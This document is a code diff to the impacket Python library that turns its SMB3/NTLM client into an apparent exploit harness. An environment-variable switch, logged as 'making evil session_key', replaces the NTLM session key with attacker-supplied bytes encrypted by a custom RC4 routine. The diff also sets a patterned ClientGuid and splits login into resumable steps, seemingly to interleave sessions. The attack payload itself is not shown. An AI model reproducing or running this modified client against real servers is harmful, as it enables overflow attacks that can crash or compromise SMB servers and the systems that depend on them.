@@ -1,0 +1,428 @@
+diff --git a/impacket/ntlm.py b/impacket/ntlm.py
+index b91561fd..80205517 100644
+--- a/impacket/ntlm.py
++++ b/impacket/ntlm.py
+@@ -24,6 +24,9 @@ from six import b
+ from impacket.structure import Structure
+ from impacket import LOG
+ 
++import os
++import base64
++
+ 
+ # This is important. NTLMv2 is not negotiated by the client or server. 
+ # It is used if set locally on both sides. Change this item if you don't want to use 
+@@ -729,11 +732,81 @@ def getNTLMSSPType3(type1, type2, user, password, domain, lmhash = '', nthash =
+     if version is not None:
+         ntlmChallengeResponse['Version'] = version
+     ntlmChallengeResponse['ntlm'] = ntResponse
+-    if encryptedRandomSessionKey is not None: 
+-        ntlmChallengeResponse['session_key'] = encryptedRandomSessionKey
++    if encryptedRandomSessionKey is not None:
++        if os.getenv('IMPACKET_OVERFLOW_NTLM'):
++            print('making evil session_key')
++            ctx = ARC4Ctx()
++            cifs_arc4_setkey(ctx, sessionBaseKey, len(sessionBaseKey))
++            data = base64.b64decode(os.getenv('IMPACKET_OVERFLOW_NTLM'))
++            ntlmChallengeResponse['session_key'] = cifs_arc4_crypt(ctx, data)
++        else:
++            ntlmChallengeResponse['session_key'] = encryptedRandomSessionKey
+ 
+     return ntlmChallengeResponse, exportedSessionKey
+ 
++class ARC4Ctx:
++    def __init__(self):
++        self.x = 0
++        self.y = 0
++        self.S = list(range(256))
++
++def cifs_arc4_setkey(ctx, in_key, key_len):
++    j = 0
++    k = 0
++
++    ctx.x = 1
++    ctx.y = 0
++
++    # Initialize S
++    for i in range(256):
++        ctx.S[i] = i
++
++    # Key-scheduling loop
++    for i in range(256):
++        a = ctx.S[i]
++        j = (j + in_key[k] + a) & 0xff
++        ctx.S[i], ctx.S[j] = ctx.S[j], a
++        k += 1
++        if k >= key_len:
++            k = 0
++    return 0
++
++def cifs_arc4_crypt(ctx, data):
++    """
++    Encrypt/decrypt `data` in-place with RC4 using ctx.
++    Since RC4 is symmetric, this works for both encryption and decryption.
++    """
++    S = ctx.S
++    x = ctx.x
++    y = ctx.y
++    a = S[x]
++    y = (y + a) & 0xff
++    b = S[y]
++
++    out = bytearray()
++    length = len(data)
++    i = 0
++
++    while True:
++        S[y] = a
++        a = (a + b) & 0xff
++        S[x] = b
++        x = (x + 1) & 0xff
++        ta = S[x]
++        ty = (y + ta) & 0xff
++        tb = S[ty]
++        out.append(data[i] ^ S[a])
++        i += 1
++        length -= 1
++        if length == 0:
++            break
++        y = ty
++        a = ta
++        b = tb
++
++    ctx.x = x
++    ctx.y = y
++    return bytes(out)
+ 
+ # NTLMv1 Algorithm
+ 
+diff --git a/impacket/smb3.py b/impacket/smb3.py
+index f77746de..d36928c5 100644
+--- a/impacket/smb3.py
++++ b/impacket/smb3.py
+@@ -194,7 +194,7 @@ class SMB3:
+         self.RequireMessageSigning = False    #
+         self.ConnectionTable = {}
+         self.GlobalFileTable = {}
+-        self.ClientGuid = ''.join([random.choice(string.ascii_letters) for i in range(16)])
++        self.ClientGuid = ''.join([random.choice(string.ascii_letters) for i in range(6)]) + ('C' * 10) 
+         # Only for SMB 3.0
+         self.EncryptionAlgorithmList = ['AES-CCM']
+         self.MaxDialect = []
+@@ -942,8 +942,21 @@ class SMB3:
+             self._Session['PreauthIntegrityHashValue'] = a2b_hex(b'0'*128)
+             raise Exception('Unsuccessful Login')
+ 
++    def login(self, user, password, domain='', lmhash='', nthash=''):
++        self.login_init(user, password, domain, lmhash, nthash)
++        return self.login_finish()
+ 
+-    def login(self, user, password, domain = '', lmhash = '', nthash = ''):
++    def login_init(self, user, password, domain='', lmhash='', nthash=''):
++        self.continuation = self.login_helper(user, password, domain, lmhash, nthash)
++        next(self.continuation)
++
++    def login_finish(self):
++        try:
++            next(self.continuation)
++        except StopIteration as e:
++            raise
++
++    def login_helper(self, user, password, domain = '', lmhash = '', nthash = ''):
+         # If we have hashes, normalize them
+         if lmhash != '' or nthash != '':
+             if len(lmhash) % 2:     lmhash = '0%s' % lmhash
+@@ -1004,149 +1017,153 @@ class SMB3:
+         ans = self.recvSMB(packetID)
+         if self._Connection['Dialect'] == SMB2_DIALECT_311:
+             self.__UpdatePreAuthHash (ans.rawData)
+-
+-        if ans.isValidAnswer(STATUS_MORE_PROCESSING_REQUIRED):
+-            self._Session['SessionID']       = ans['SessionID']
+-            self._Session['SigningRequired'] = self._Connection['RequireSigning']
+-            self._Session['UserCredentials'] = (user, password, domain, lmhash, nthash)
+-            self._Session['Connection']      = self._NetBIOSSession.get_socket()
+-            sessionSetupResponse = SMB2SessionSetup_Response(ans['Data'])
+-            respToken = SPNEGO_NegTokenResp(sessionSetupResponse['Buffer'])
+-
+-            # Let's parse some data and keep it to ourselves in case it is asked
+-            ntlmChallenge = ntlm.NTLMAuthChallenge(respToken['ResponseToken'])
+-            if ntlmChallenge['TargetInfoFields_len'] > 0:
+-                av_pairs = ntlm.AV_PAIRS(ntlmChallenge['TargetInfoFields'][:ntlmChallenge['TargetInfoFields_len']])
+-                if av_pairs[ntlm.NTLMSSP_AV_HOSTNAME] is not None:
+-                   try:
+-                       self._Session['ServerName'] = av_pairs[ntlm.NTLMSSP_AV_HOSTNAME][1].decode('utf-16le')
+-                   except:
+-                       # For some reason, we couldn't decode Unicode here.. silently discard the operation
+-                       pass
+-                if av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME] is not None:
+-                   try:
+-                       if self._Session['ServerName'] != av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME][1].decode('utf-16le'):
+-                           self._Session['ServerDomain'] = av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME][1].decode('utf-16le')
+-                   except:
+-                       # For some reason, we couldn't decode Unicode here.. silently discard the operation
+-                       pass
+-                if av_pairs[ntlm.NTLMSSP_AV_DNS_DOMAINNAME] is not None:
+-                   try:
+-                       self._Session['ServerDNSDomainName'] = av_pairs[ntlm.NTLMSSP_AV_DNS_DOMAINNAME][1].decode('utf-16le')
+-                   except:
+-                       # For some reason, we couldn't decode Unicode here.. silently discard the operation
+-                       pass
+-
+-                if av_pairs[ntlm.NTLMSSP_AV_DNS_HOSTNAME] is not None:
+-                   try:
+-                       self._Session['ServerDNSHostName'] = av_pairs[ntlm.NTLMSSP_AV_DNS_HOSTNAME][1].decode('utf-16le')
+-                   except:
+-                       # For some reason, we couldn't decode Unicode here.. silently discard the operation
+-                       pass
+-
+-                if self._strict_hostname_validation:
+-                    self.perform_hostname_validation()
+-
+-                # Parse Version to know the target Operating system name. Not provided elsewhere anymore
+-                if 'Version' in ntlmChallenge.fields:
+-                    version = ntlmChallenge['Version']
+-
+-                    if len(version) >= 4:
+-                        if struct.unpack('<H',version[2:4])[0] in WIN_VERSIONS.keys():
+-                            self._Session['ServerOS'] = WIN_VERSIONS[struct.unpack('<H',version[2:4])[0]] + " Build %d" % struct.unpack('<H',version[2:4])[0]
+-                        else:
+-                            self._Session['ServerOS'] = "Windows %d.%d Build %d" % (indexbytes(version,0), indexbytes(version,1), struct.unpack('<H',version[2:4])[0])
+-                        self._Session["ServerOSMajor"] = indexbytes(version,0)
+-                        self._Session["ServerOSMinor"] = indexbytes(version,1)
+-                        self._Session["ServerOSBuild"] = struct.unpack('<H',version[2:4])[0]
+-
+-            type3, exportedSessionKey = ntlm.getNTLMSSPType3(auth, respToken['ResponseToken'], user, password, domain, lmhash, nthash)
+-
+-            respToken2 = SPNEGO_NegTokenResp()
+-            respToken2['ResponseToken'] = type3.getData()
+-
+-            # Reusing the previous structure
+-            sessionSetup['SecurityBufferLength'] = len(respToken2)
+-            sessionSetup['Buffer']               = respToken2.getData()
+-
+-            packetID = self.sendSMB(packet)
+-            packet = self.recvSMB(packetID)
+-
+-            # Let's calculate Key Materials before moving on
+-            if exportedSessionKey is not None:
+-                self._Session['SessionKey']  = exportedSessionKey
+-                if self._Session['SigningRequired'] is True and self._Connection['Dialect'] >= SMB2_DIALECT_30:
+-                    # If Connection.Dialect is "3.1.1", the case-sensitive ASCII string "SMBSigningKey" as the label;
+-                    # otherwise, the case - sensitive ASCII string "SMB2AESCMAC" as the label.
+-                    # If Connection.Dialect is "3.1.1", Session.PreauthIntegrityHashValue as the context; otherwise,
+-                    # the case-sensitive ASCII string "SmbSign" as context for the algorithm.
+-                    if self._Connection['Dialect'] == SMB2_DIALECT_311:
+-                        self._Session['SigningKey'] = crypto.KDF_CounterMode (exportedSessionKey,
+-                                                                              b"SMBSigningKey\x00",
+-                                                                              self._Session['PreauthIntegrityHashValue'],
+-                                                                              128)
+-                    else:
+-                        self._Session['SigningKey'] = crypto.KDF_CounterMode (exportedSessionKey, b"SMB2AESCMAC\x00",
+-                                                                              b"SmbSign\x00", 128)
+-            try:
+-                if packet.isValidAnswer(STATUS_SUCCESS):
+-                    sessionSetupResponse = SMB2SessionSetup_Response(packet['Data'])
+-                    self._Session['SessionFlags'] = sessionSetupResponse['SessionFlags']
+-                    self._Session['SessionID']    = packet['SessionID']
+-
+-                    # Do not encrypt anonymous connections
+-                    if user == '' or self.isGuestSession():
+-                        self._Connection['SupportsEncryption'] = False
+-
+-                    # Calculate the key derivations for dialect 3.0
+-                    if self._Session['SigningRequired'] is True:
+-                        self._Session['SigningActivated'] = True
+-                    if self._Connection['Dialect'] >= SMB2_DIALECT_30 and self._Connection['SupportsEncryption'] is True:
+-                        # SMB 3.0. Encryption available. Let's enforce it if we have AES CCM available
+-                        self._Session['SessionFlags'] |= SMB2_SESSION_FLAG_ENCRYPT_DATA
+-                        # Application Key
+-                        # If Connection.Dialect is "3.1.1",the case-sensitive ASCII string "SMBAppKey" as the label;
+-                        # otherwise, the case-sensitive ASCII string "SMB2APP" as the label. Session.PreauthIntegrityHashValue
+-                        # as the context; otherwise, the case-sensitive ASCII string "SmbRpc" as context for the algorithm.
+-                        # Encryption Key
+-                        # If Connection.Dialect is "3.1.1",the case-sensitive ASCII string "SMBC2SCipherKey" as # the label;
+-                        # otherwise, the case-sensitive ASCII string "SMB2AESCCM" as the label. Session.PreauthIntegrityHashValue
+-                        # as the context; otherwise, the case-sensitive ASCII string "ServerIn " as context for the algorithm
+-                        # (note the blank space at the end)
+-                        # Decryption Key
+-                        # If Connection.Dialect is "3.1.1", the case-sensitive ASCII string "SMBS2CCipherKey" as the label;
+-                        # otherwise, the case-sensitive ASCII string "SMB2AESCCM" as the label. Session.PreauthIntegrityHashValue
+-                        # as the context; otherwise, the case-sensitive ASCII string "ServerOut" as context for the algorithm.
++        self.first_half = (ans, sessionSetup, auth, user, password, domain, lmhash, nthash, packet)
++        yield
++
++        while True:
++            ans, sessionSetup, auth, user, password, domain, lmhash, nthash, packet = self.first_half
++            if ans.isValidAnswer(STATUS_MORE_PROCESSING_REQUIRED):
++                self._Session['SessionID']       = ans['SessionID']
++                self._Session['SigningRequired'] = self._Connection['RequireSigning']
++                self._Session['UserCredentials'] = (user, password, domain, lmhash, nthash)
++                self._Session['Connection']      = self._NetBIOSSession.get_socket()
++                sessionSetupResponse = SMB2SessionSetup_Response(ans['Data'])
++                respToken = SPNEGO_NegTokenResp(sessionSetupResponse['Buffer'])
++
++                # Let's parse some data and keep it to ourselves in case it is asked
++                ntlmChallenge = ntlm.NTLMAuthChallenge(respToken['ResponseToken'])
++                if ntlmChallenge['TargetInfoFields_len'] > 0:
++                    av_pairs = ntlm.AV_PAIRS(ntlmChallenge['TargetInfoFields'][:ntlmChallenge['TargetInfoFields_len']])
++                    if av_pairs[ntlm.NTLMSSP_AV_HOSTNAME] is not None:
++                       try:
++                           self._Session['ServerName'] = av_pairs[ntlm.NTLMSSP_AV_HOSTNAME][1].decode('utf-16le')
++                       except:
++                           # For some reason, we couldn't decode Unicode here.. silently discard the operation
++                           pass
++                    if av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME] is not None:
++                       try:
++                           if self._Session['ServerName'] != av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME][1].decode('utf-16le'):
++                               self._Session['ServerDomain'] = av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME][1].decode('utf-16le')
++                       except:
++                           # For some reason, we couldn't decode Unicode here.. silently discard the operation
++                           pass
++                    if av_pairs[ntlm.NTLMSSP_AV_DNS_DOMAINNAME] is not None:
++                       try:
++                           self._Session['ServerDNSDomainName'] = av_pairs[ntlm.NTLMSSP_AV_DNS_DOMAINNAME][1].decode('utf-16le')
++                       except:
++                           # For some reason, we couldn't decode Unicode here.. silently discard the operation
++                           pass
++
++                    if av_pairs[ntlm.NTLMSSP_AV_DNS_HOSTNAME] is not None:
++                       try:
++                           self._Session['ServerDNSHostName'] = av_pairs[ntlm.NTLMSSP_AV_DNS_HOSTNAME][1].decode('utf-16le')
++                       except:
++                           # For some reason, we couldn't decode Unicode here.. silently discard the operation
++                           pass
++
++                    if self._strict_hostname_validation:
++                        self.perform_hostname_validation()
++
++                    # Parse Version to know the target Operating system name. Not provided elsewhere anymore
++                    if 'Version' in ntlmChallenge.fields:
++                        version = ntlmChallenge['Version']
++
++                        if len(version) >= 4:
++                            if struct.unpack('<H',version[2:4])[0] in WIN_VERSIONS.keys():
++                                self._Session['ServerOS'] = WIN_VERSIONS[struct.unpack('<H',version[2:4])[0]] + " Build %d" % struct.unpack('<H',version[2:4])[0]
++                            else:
++                                self._Session['ServerOS'] = "Windows %d.%d Build %d" % (indexbytes(version,0), indexbytes(version,1), struct.unpack('<H',version[2:4])[0])
++                            self._Session["ServerOSMajor"] = indexbytes(version,0)
++                            self._Session["ServerOSMinor"] = indexbytes(version,1)
++                            self._Session["ServerOSBuild"] = struct.unpack('<H',version[2:4])[0]
++
++                type3, exportedSessionKey = ntlm.getNTLMSSPType3(auth, respToken['ResponseToken'], user, password, domain, lmhash, nthash)
++
++                respToken2 = SPNEGO_NegTokenResp()
++                respToken2['ResponseToken'] = type3.getData()
++
++                # Reusing the previous structure
++                sessionSetup['SecurityBufferLength'] = len(respToken2)
++                sessionSetup['Buffer']               = respToken2.getData()
++
++                packetID = self.sendSMB(packet)
++                packet = self.recvSMB(packetID)
++
++                # Let's calculate Key Materials before moving on
++                if exportedSessionKey is not None:
++                    self._Session['SessionKey']  = exportedSessionKey
++                    if self._Session['SigningRequired'] is True and self._Connection['Dialect'] >= SMB2_DIALECT_30:
++                        # If Connection.Dialect is "3.1.1", the case-sensitive ASCII string "SMBSigningKey" as the label;
++                        # otherwise, the case - sensitive ASCII string "SMB2AESCMAC" as the label.
++                        # If Connection.Dialect is "3.1.1", Session.PreauthIntegrityHashValue as the context; otherwise,
++                        # the case-sensitive ASCII string "SmbSign" as context for the algorithm.
+                         if self._Connection['Dialect'] == SMB2_DIALECT_311:
+-                            self._Session['ApplicationKey']  = crypto.KDF_CounterMode(exportedSessionKey, b"SMBAppKey\x00",
+-                                                                             self._Session['PreauthIntegrityHashValue'], 128)
+-                            self._Session['EncryptionKey']   = crypto.KDF_CounterMode(exportedSessionKey, b"SMBC2SCipherKey\x00",
+-                                                                             self._Session['PreauthIntegrityHashValue'], 128)
+-                            self._Session['DecryptionKey'] = crypto.KDF_CounterMode (exportedSessionKey, b"SMBS2CCipherKey\x00",
+-                                                                             self._Session['PreauthIntegrityHashValue'], 128)
+-
++                            self._Session['SigningKey'] = crypto.KDF_CounterMode (exportedSessionKey,
++                                                                                  b"SMBSigningKey\x00",
++                                                                                  self._Session['PreauthIntegrityHashValue'],
++                                                                                  128)
+                         else:
+-                            self._Session['ApplicationKey'] = crypto.KDF_CounterMode (exportedSessionKey, b"SMB2APP\x00",
+-                                                                                      b"SmbRpc\x00", 128)
+-                            self._Session['EncryptionKey'] = crypto.KDF_CounterMode (exportedSessionKey, b"SMB2AESCCM\x00",
+-                                                                                     b"ServerIn \x00", 128)
+-                            self._Session['DecryptionKey'] = crypto.KDF_CounterMode (exportedSessionKey, b"SMB2AESCCM\x00",
+-                                                                                     b"ServerOut\x00", 128)
++                            self._Session['SigningKey'] = crypto.KDF_CounterMode (exportedSessionKey, b"SMB2AESCMAC\x00",
++                                                                                  b"SmbSign\x00", 128)
++                try:
++                    if packet.isValidAnswer(STATUS_SUCCESS):
++                        sessionSetupResponse = SMB2SessionSetup_Response(packet['Data'])
++                        self._Session['SessionFlags'] = sessionSetupResponse['SessionFlags']
++                        self._Session['SessionID']    = packet['SessionID']
++
++                        # Do not encrypt anonymous connections
++                        if user == '' or self.isGuestSession():
++                            self._Connection['SupportsEncryption'] = False
++
++                        # Calculate the key derivations for dialect 3.0
++                        if self._Session['SigningRequired'] is True:
++                            self._Session['SigningActivated'] = True
++                        if self._Connection['Dialect'] >= SMB2_DIALECT_30 and self._Connection['SupportsEncryption'] is True:
++                            # SMB 3.0. Encryption available. Let's enforce it if we have AES CCM available
++                            self._Session['SessionFlags'] |= SMB2_SESSION_FLAG_ENCRYPT_DATA
++                            # Application Key
++                            # If Connection.Dialect is "3.1.1",the case-sensitive ASCII string "SMBAppKey" as the label;
++                            # otherwise, the case-sensitive ASCII string "SMB2APP" as the label. Session.PreauthIntegrityHashValue
++                            # as the context; otherwise, the case-sensitive ASCII string "SmbRpc" as context for the algorithm.
++                            # Encryption Key
++                            # If Connection.Dialect is "3.1.1",the case-sensitive ASCII string "SMBC2SCipherKey" as # the label;
++                            # otherwise, the case-sensitive ASCII string "SMB2AESCCM" as the label. Session.PreauthIntegrityHashValue
++                            # as the context; otherwise, the case-sensitive ASCII string "ServerIn " as context for the algorithm
++                            # (note the blank space at the end)
++                            # Decryption Key
++                            # If Connection.Dialect is "3.1.1", the case-sensitive ASCII string "SMBS2CCipherKey" as the label;
++                            # otherwise, the case-sensitive ASCII string "SMB2AESCCM" as the label. Session.PreauthIntegrityHashValue
++                            # as the context; otherwise, the case-sensitive ASCII string "ServerOut" as context for the algorithm.
++                            if self._Connection['Dialect'] == SMB2_DIALECT_311:
++                                self._Session['ApplicationKey']  = crypto.KDF_CounterMode(exportedSessionKey, b"SMBAppKey\x00",
++                                                                                 self._Session['PreauthIntegrityHashValue'], 128)
++                                self._Session['EncryptionKey']   = crypto.KDF_CounterMode(exportedSessionKey, b"SMBC2SCipherKey\x00",
++                                                                                 self._Session['PreauthIntegrityHashValue'], 128)
++                                self._Session['DecryptionKey'] = crypto.KDF_CounterMode (exportedSessionKey, b"SMBS2CCipherKey\x00",
++                                                                                 self._Session['PreauthIntegrityHashValue'], 128)
++
++                            else:
++                                self._Session['ApplicationKey'] = crypto.KDF_CounterMode (exportedSessionKey, b"SMB2APP\x00",
++                                                                                          b"SmbRpc\x00", 128)
++                                self._Session['EncryptionKey'] = crypto.KDF_CounterMode (exportedSessionKey, b"SMB2AESCCM\x00",
++                                                                                         b"ServerIn \x00", 128)
++                                self._Session['DecryptionKey'] = crypto.KDF_CounterMode (exportedSessionKey, b"SMB2AESCCM\x00",
++                                                                                         b"ServerOut\x00", 128)
++                        self._Session['CalculatePreAuthHash'] = False
++                        yield True
++                except:
++                    # We clean the stuff we used in case we want to authenticate again
++                    # within the same connection
++                    self._Session['UserCredentials']   = ''
++                    self._Session['Connection']        = 0
++                    self._Session['SessionID']         = 0
++                    self._Session['SigningRequired']   = False
++                    self._Session['SigningKey']        = ''
++                    self._Session['SessionKey']        = ''
++                    self._Session['SigningActivated']  = False
+                     self._Session['CalculatePreAuthHash'] = False
+-                    return True
+-            except:
+-                # We clean the stuff we used in case we want to authenticate again
+-                # within the same connection
+-                self._Session['UserCredentials']   = ''
+-                self._Session['Connection']        = 0
+-                self._Session['SessionID']         = 0
+-                self._Session['SigningRequired']   = False
+-                self._Session['SigningKey']        = ''
+-                self._Session['SessionKey']        = ''
+-                self._Session['SigningActivated']  = False
+-                self._Session['CalculatePreAuthHash'] = False
+-                self._Session['PreauthIntegrityHashValue'] = a2b_hex(b'0'*128)
+-                raise
++                    self._Session['PreauthIntegrityHashValue'] = a2b_hex(b'0'*128)
++                    raise
+ 
+     def connectTree(self, share):
+ 
